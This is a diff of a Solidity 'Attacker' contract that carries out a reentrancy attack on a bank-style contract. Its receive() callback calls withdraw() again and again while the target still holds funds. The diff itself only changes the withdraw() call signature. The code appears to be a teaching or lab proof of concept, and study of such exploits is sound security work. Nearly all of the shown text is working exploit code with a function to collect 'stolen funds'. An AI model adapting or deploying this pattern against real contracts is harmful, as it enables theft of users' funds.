@@ -3,7 +3,8 @@ pragma solidity ^0.8.20;
 
 interface IeBank {
     function deposit() external payable;
-    function withdraw(uint256 _amount) external;
+
+    function withdraw() external;
 }
 
 contract Attacker {
@@ -16,14 +17,14 @@ contract Attacker {
 
     receive() external payable {
         if (address(targetContract).balance >= ETHER_AMOUNT) {
-            targetContract.withdraw(ETHER_AMOUNT);
+            targetContract.withdraw();
         }
     }
 
     function attack() external payable {
         require(msg.value >= ETHER_AMOUNT);
         targetContract.deposit{value: 1 ether}();
-        targetContract.withdraw(ETHER_AMOUNT);
+        targetContract.withdraw();
     }
 
     function withdrawStolenFunds() public {
